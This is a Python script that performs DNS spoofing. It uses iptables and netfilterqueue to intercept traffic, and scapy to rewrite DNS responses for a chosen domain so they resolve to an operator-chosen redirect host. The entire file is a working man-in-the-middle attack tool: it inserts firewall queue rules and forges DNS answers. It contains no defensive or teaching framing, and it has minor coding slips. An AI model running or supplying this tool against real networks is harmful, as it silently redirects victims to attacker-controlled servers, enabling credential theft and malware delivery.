import netfilterqueue
import scapy.all as scapy
import subprocess
import optparse

def getArgs():
    parser = optparse.OptionParser()
    parser.add_option("-q", "--queue", dest="queueNum", help="Specify queue number.")
    parser.add_option("-t", "--test", dest="test", help="Test only on your machine 0 for no 1 for yes.")
    parser.add_option("--oh", "--originhost", dest="host", help="Specify the host you want to spoof.")
    parser.add_option("--rh", "--redirecthost", dest="rhost", help="Specify the host you want to redirect the target to.")
    (opt, arg) = parser.parse_args()
    if not opt.queueNum:
        parser.error("[-] Plase specify queue number. Use --help for more information.")
    if not opt.test:
        parser.error("[-] Plase specify test option. Use --help for more information.")
    if not opt.host:
        parser.error("[-] Plase specify the host you wish to spoof.")
    if not opt.rhost:
        parser.error("[-] Plase specify the host you wish to redirect the target to.")
    return opt

def createQueue(queueNum, test):
    if test == 0:
        subprocess.call(["iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num", queueNum])
        print("Queue created!")
    if test == 1:
        subprocess.call(["iptables", "-I", "OUTPUT", "-j", "NFQUEUE", "--queue-num", queueNum])
        subprocess.call(["iptables", "-I", "INPUT", "-j", "NFQUEUE", "--queue-num", queueNum])
        print("Test queue created!")

def processPacket(packet):
    host = getArgs().host
    rhost = getArgs().rhost

    scapyPacket = scapy.IP(packet.get_payload())
    if scapyPacket.haslayer(scapy.DNSRR):
        qname = scapyPacket[scapy.DNSQR].qname
        if host in qname:
            print(qname)
            answer = scapy.DNSRR(rrname=qname, rdata=rhost)
            scapyPacket[scapy.DNS].an = answer
            scapyPacket[scapy.DNS].ancount = 1

            del scapyPacket[scapy.IP].len
            del scapyPacket[scapy.IP].chksum
            del scapyPacket[scapy.UDP].chksum
            del scapyPacket[scapy.UDP].chksum

            packet.set_payload(str(scapyPacket))

    packet.accept()


opt = getArgs()
createQueue(opt.queueNum, int(opt.test))
queue = netfilterqueue.NetfilterQueue()
queue.bind(int(opt.queueNum), processPacket)
queue.run()

